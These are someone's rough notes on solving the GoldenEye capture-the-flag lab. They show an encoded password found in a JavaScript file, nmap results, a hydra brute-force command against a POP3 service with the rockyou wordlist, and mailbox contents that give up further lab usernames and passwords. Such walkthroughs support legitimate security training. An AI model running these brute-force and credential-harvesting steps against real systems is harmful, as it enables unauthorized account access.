### Golden Eye ###

export IP=10.10.156.146

the ip has a http server on it - viewing the source code i find that the console type thingy is coming from terminal.js

the source code of terminal.js had some hashed lines of:

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

the hash is decimal code:decoing it:InvincibleHack3r
still waiting for the nmap results :(....
meanwhile, the site mentioned to login to /sev-home/ page so trying Boris and the above password

We are able to enumerate 4 open ports on the satellite, specifically Port 25 (SMTP), port 80 (HTTP), Port 55006 (SSL), Port 55007 (POP3). 
this is the nmap result that i copied from writeup because i cant wait any longer :/

using hydra to bruteforce pop3 for user:Natalya

so what i need is a faster way to use hydra found the pass on the writeup:secret!

using telnet 10.10.156.146 55007

list is for ls
retr <number you see on the list command> is for cat

found a user:janus, Xenia

### TODO:use hydra to find passwords of natalya and xenia on the same pop3 port:55007###

hydra -l natalya -P /usr/share/wordlists/rockyou.txt 10.10.75.212 -s 55007 pop3

[55007][pop3] host: 10.10.75.212   login: natalya   password: bird


Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.


Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


